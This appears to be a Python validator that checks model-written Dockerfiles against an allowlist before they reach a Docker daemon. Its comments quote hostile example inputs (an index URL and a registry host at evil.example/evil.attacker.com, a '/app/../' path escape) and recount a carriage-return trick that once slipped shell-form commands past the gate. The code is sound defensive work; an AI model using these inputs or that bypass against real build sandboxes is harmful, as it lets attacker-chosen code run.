"""The deterministic gate. Nothing reaches the daemon without passing this.

An allowlist of permitted instructions, never a blocklist of forbidden ones. A
blocklist is defeated by the first form nobody thought of, and the thing being
checked was written by a model that had just read attacker-controlled text.

Returns a reason to refuse, or None to allow. The reason is shown to the model as
repair evidence, so it says what is wrong rather than merely that something is.
"""

from __future__ import annotations

import json
import posixpath
import re

INSTRUCTIONS = ("FROM", "COPY", "RUN", "USER", "CMD", "ENTRYPOINT")

# Docker breaks lines on \n and nothing else, so the gate does too, and the two cannot
# disagree about what a line is. The first version of this used splitlines(), which
# breaks on nine other characters, and was patched by listing them. That list was
# missing \r, the most common member of its own category, which is what an enumeration
# of bad characters always eventually is.
#
# So the remaining rule is an allowlist, like everything else here: a Dockerfile may
# contain printable characters, newlines and tabs. Anything else is refused without
# anyone needing to have thought of it first.
ALLOWED_WHITESPACE = "\n\t"

# RUN is exec form, so there is no shell and nothing to escape into. That is why this
# is a list of argv heads rather than a list of string prefixes: `pip install` as a
# string prefix also matches `pip install --index-url https://evil.example/ foo`.
RUN_COMMANDS = (
    ("pip", "install"),
    ("pip3", "install"),
    ("python", "-m", "pip", "install"),
    ("apt-get", "update"),
    ("apt-get", "install"),
)

RUN_FLAGS = frozenset({"-y", "--no-cache-dir", "--no-input", "--quiet"})

# A package name, optionally with a version specifier. Deliberately narrow: it admits
# `flask>=2.0,<4` and refuses `https://evil.example/x.tar.gz`, `git+https://...`,
# `/app/x.deb`, and `--target`, all of which are ways to install something other than
# a named package from the default index.
PACKAGE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]*([<>=!~][^\s]*)?$")

# Everything COPY writes lands here, so a Dockerfile cannot overwrite /etc/passwd or
# shadow an interpreter on PATH with a file whose contents the attacker controls.
COPY_DESTINATION = "/app"


def _reason(number: int, line: str, problem: str) -> str:
    return f"line {number}, {line.strip()!r}: {problem}"


def _check_from(number: int, line: str, base_image: str) -> str | None:
    parts = line.split()
    if len(parts) != 2:
        # Catches multi-stage builds too. `FROM x AS builder` is four tokens, and a
        # second stage can COPY --from= anything the first stage produced.
        return _reason(number, line, "FROM takes exactly one image and nothing else")
    reference = parts[1]
    if reference != base_image:
        return _reason(number, line,
                       f"FROM must be the declared base_image {base_image!r}")
    if "@" in reference:
        # A digest pins harder than a tag but pins to one architecture, so an image
        # that builds on arm64 fails on the amd64 runner.
        return _reason(number, line, "pin with a tag, not a digest")
    segments = reference.split("/")
    if len(segments) > 2:
        return _reason(number, line, "too many path segments for a Docker Hub image")
    if len(segments) == 2 and ("." in segments[0] or ":" in segments[0]):
        # `evil.attacker.com/img:1` is a valid reference, and building it would make
        # the daemon pull from a host the attacker chose.
        return _reason(number, line, "no registry host, Docker Hub images only")
    name = segments[-1]
    if ":" not in name:
        return _reason(number, line, "FROM needs an explicit tag")
    tag = name.rsplit(":", 1)[1]
    if not tag:
        return _reason(number, line, "FROM needs an explicit tag")
    if tag == "latest":
        return _reason(number, line, "latest is not a pin, name a version")
    return None


def _check_copy(number: int, line: str, allowed_files: frozenset[str]) -> str | None:
    parts = line.split()
    if len(parts) != 3:
        return _reason(number, line, "COPY takes exactly a source and a destination")
    source, destination = parts[1], parts[2]
    if source not in allowed_files:
        return _reason(number, line,
                       f"COPY may only name {', '.join(sorted(allowed_files))}")
    # Normalise before comparing, never after. A prefix test on the raw string is
    # defeated by the first `..`: `/app/../escaped/s.py` starts with `/app/` and Docker
    # writes it to `/escaped/s.py`, verified against the daemon on 2026-08-25.
    resolved = posixpath.normpath(destination)
    if resolved != COPY_DESTINATION and not resolved.startswith(COPY_DESTINATION + "/"):
        return _reason(number, line,
                       f"COPY destination must be {COPY_DESTINATION} or under it, "
                       f"and {destination!r} resolves to {resolved!r}")
    return None


def _check_run(number: int, line: str) -> str | None:
    """RUN is exec form, which is what makes its arguments inspectable.

    Shell form would be `/bin/sh -c "pip install x"`, so the only defence available is
    banning shell metacharacters in a string. That ban is a proxy for "no shell will
    interpret this", and it has collateral: `>` and `<` are redirection operators and
    version-specifier operators at the same time, so `pip install "flask>=2.0"` is
    refused for looking like a redirect. Exec form makes the proxy unnecessary, because
    there is no shell, and it turns the command into a list we can check argument by
    argument instead of a prefix we can only match against.
    """
    argv = _exec_form(number, line, "RUN")
    if isinstance(argv, str):
        return argv
    prefix = next((p for p in RUN_COMMANDS if tuple(argv[:len(p)]) == p), None)
    if prefix is None:
        allowed = ", ".join(" ".join(p) for p in RUN_COMMANDS)
        return _reason(number, line, f"RUN must be one of: {allowed}")
    for argument in argv[len(prefix):]:
        if argument in RUN_FLAGS:
            continue
        if argument.startswith("-"):
            return _reason(number, line,
                           f"the flag {argument!r} is not allowed. "
                           f"Permitted: {', '.join(sorted(RUN_FLAGS))}")
        if not PACKAGE.match(argument):
            return _reason(number, line,
                           f"{argument!r} is not a package name. Install named packages "
                           "from the default index, not URLs, git references or paths")
    return None


def _exec_form(number: int, line: str, keyword: str) -> list[str] | str:
    """The argv, or the reason it is not one.

    Shell form re-splits inside `/bin/sh -c`, which is the string-versus-list problem
    the sandbox already refuses to make with the docker command itself.
    """
    rest = line[len(keyword):].strip()
    try:
        parsed = json.loads(rest)
    except json.JSONDecodeError:
        return _reason(number, line,
                       f'{keyword} must be exec form, a JSON array, '
                       f'for example {keyword} ["pip", "install", "requests"]')
    if not isinstance(parsed, list) or not parsed:
        return _reason(number, line, f"{keyword} must be a non-empty JSON array")
    if not all(isinstance(item, str) for item in parsed):
        return _reason(number, line, f"{keyword} array must hold only strings")
    return parsed


def _check_exec_form(number: int, line: str, keyword: str) -> str | None:
    result = _exec_form(number, line, keyword)
    return result if isinstance(result, str) else None


def check(dockerfile: str, base_image: str,
          allowed_files: frozenset[str]) -> str | None:
    """Allow, or say why not.

    Continuations are refused before anything else, which is what makes every later
    rule sound: with no continuations each physical line is a whole instruction, so a
    per-line allowlist cannot be walked past by an instruction that starts on one line
    and does its work on the next.
    """
    if not dockerfile.strip():
        return "the Dockerfile is empty"
    unprintable = next((c for c in dockerfile
                        if not c.isprintable() and c not in ALLOWED_WHITESPACE), None)
    if unprintable is not None:
        # A carriage return here was a real bypass. The gate split the line, saw two
        # valid exec-form instructions and allowed them; Docker kept it as one line,
        # failed to parse it as JSON, fell back to shell form, and ran the whole thing
        # through /bin/sh -c during the phase that has network.
        return (f"the Dockerfile contains {unprintable!r}. Only printable characters, "
                "newlines and tabs are allowed")

    seen_from = False
    seen_command = False

    # split("\n"), never splitlines(), so a line here is a line to Docker as well.
    # The printable check above already refuses everything splitlines() would break on
    # that Docker would not, so this is defence in depth rather than the only guard,
    # and it cannot be tested through check() on its own.
    for number, line in enumerate(dockerfile.split("\n"), start=1):
        if line.rstrip().endswith("\\"):
            return _reason(number, line, "no line continuations, one instruction per line")
        stripped = line.strip()
        if stripped.startswith("#"):
            if re.match(r"#\s*(escape|syntax)\s*=", stripped):
                # A parser directive changes how Docker reads the rest of the file,
                # including which character continues a line. Nothing legitimate here
                # needs one, and it is attacker-controlled surface either way.
                return _reason(number, line, "no parser directives")
            continue
        if not stripped:
            continue

        keyword = stripped.split(maxsplit=1)[0].upper()
        if keyword not in INSTRUCTIONS:
            return _reason(number, line,
                           f"{keyword} is not allowed. Permitted: {', '.join(INSTRUCTIONS)}")
        if keyword == "FROM":
            if seen_from:
                return _reason(number, line, "only one FROM, no multi-stage builds")
            problem = _check_from(number, stripped, base_image)
            if problem:
                return problem
            seen_from = True
            continue
        if not seen_from:
            return _reason(number, line, "FROM must be the first instruction")

        if keyword == "COPY":
            problem = _check_copy(number, stripped, allowed_files)
        elif keyword == "RUN":
            problem = _check_run(number, stripped)
        elif keyword == "USER":
            problem = (None if len(stripped.split()) == 2
                       else _reason(number, line, "USER takes exactly one name"))
        else:
            problem = _check_exec_form(number, stripped, keyword)
            seen_command = seen_command or problem is None
        if problem:
            return problem

    if not seen_from:
        return "the Dockerfile has no FROM"
    if not seen_command:
        return "the Dockerfile has no CMD or ENTRYPOINT, so the image runs nothing"
    return None
